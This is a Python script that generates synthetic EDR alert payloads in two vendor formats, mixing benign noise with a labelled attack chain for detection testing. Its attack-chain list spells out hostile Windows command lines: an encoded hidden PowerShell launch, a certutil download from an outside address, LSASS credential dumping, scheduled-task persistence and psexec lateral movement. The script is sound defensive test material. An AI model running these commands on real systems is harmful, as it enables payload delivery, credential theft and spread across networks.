"""Generate realistic synthetic EDR traffic: background noise plus labelled attack chains."""
from __future__ import annotations

import random
from datetime import datetime, timedelta, timezone
from typing import Any

BASE = datetime(2026, 3, 2, 8, 0, tzinfo=timezone.utc)

NOISE = [
    ("Unsigned binary executed", "updater.exe", "updater.exe /silent", "explorer.exe", 15),
    ("Rare process", "teams.exe", "teams.exe --type=renderer", "teams.exe", 10),
    ("Script execution", "cscript.exe", "cscript.exe logon.vbs", "userinit.exe", 25),
    ("Admin tool", "whoami.exe", "whoami /all", "cmd.exe", 30),
    ("Browser download", "chrome.exe", "chrome.exe --download", "explorer.exe", 5),
]

ATTACK_CHAIN = [
    # (minute offset, title, process, command line, parent, severity 0-100)
    (0, "Office spawned shell", "powershell.exe", "powershell.exe -nop -w hidden -enc SQBFAFgA", "winword.exe", 70),
    (2, "Payload download", "certutil.exe", "certutil.exe -urlcache -f http://203.0.113.7/a.dll a.dll",
     "powershell.exe", 60),
    (4, "Proxy execution", "rundll32.exe", "rundll32.exe a.dll,Start", "powershell.exe", 65),
    (6, "Discovery", "net.exe", "net group \"domain admins\" /domain", "powershell.exe", 40),
    (9, "Credential dumping", "rundll32.exe", "rundll32.exe comsvcs.dll MiniDump 624 lsass.dmp full",
     "powershell.exe", 95),
    (12, "Persistence", "schtasks.exe", "schtasks.exe /create /tn upd /tr a.dll /sc onlogon", "powershell.exe", 70),
    (15, "Lateral movement", "psexec.exe", "psexec.exe \\\\fin-srv-02 -s cmd.exe", "powershell.exe", 85),
]


def _payload(vendor: str, n: int, t: datetime, title: str, proc: str, cmd: str, parent: str, sev: int,
             host: str, ip: str, user: str) -> dict[str, Any]:
    if vendor == "edr_a":
        return {"vendor": "edr_a", "detection_id": f"A-{n:05d}", "timestamp": t.isoformat(), "severity": sev,
                "name": title, "device": {"hostname": host.upper(), "local_ip": ip, "platform": "Windows"},
                "user_name": user, "filename": proc, "cmdline": cmd, "parent_filename": parent}
    word = ["informational", "low", "medium", "high", "critical"][min(4, sev // 20)]
    return {"vendor": "edr_b", "id": f"B-{n:05d}", "createdTime": int(t.timestamp() * 1000), "severity": word,
            "title": title, "machine": {"name": host, "ip": ip},
            "evidence": {"process": {"image": proc, "commandLine": cmd, "parentImage": parent, "account": user}}}


def generate(hosts: int = 40, noise_per_host: int = 6, attacked: tuple[str, ...] = ("fin-wks-07", "eng-wks-22"),
             seed: int = 42) -> tuple[list[dict[str, Any]], set[str]]:
    """Return (raw vendor payloads, set of hostnames that were really attacked)."""
    rng = random.Random(seed)
    names = [f"{dept}-wks-{i:02d}" for dept in ("fin", "eng", "ops", "hr") for i in range(1, hosts // 4 + 1)]
    names = sorted(set(names) | set(attacked))
    payloads: list[dict[str, Any]] = []
    n = 0
    for h, host in enumerate(names):
        ip, user = f"10.0.{h // 250}.{h % 250 + 1}", f"user{h:03d}"
        for _ in range(noise_per_host):
            title, proc, cmd, parent, sev = rng.choice(NOISE)
            t = BASE + timedelta(minutes=rng.randint(0, 600))
            vendor = rng.choice(["edr_a", "edr_b"])
            payloads.append(_payload(vendor, n, t, title, proc, cmd, parent, sev, host, ip, user))
            n += 1
        if host in attacked:
            start = BASE + timedelta(minutes=rng.randint(60, 480))
            for off, title, proc, cmd, parent, sev in ATTACK_CHAIN:
                payloads.append(_payload(rng.choice(["edr_a", "edr_b"]), n, start + timedelta(minutes=off),
                                         title, proc, cmd, parent, sev, host, ip, user))
                n += 1
    rng.shuffle(payloads)
    return payloads, set(attacked)
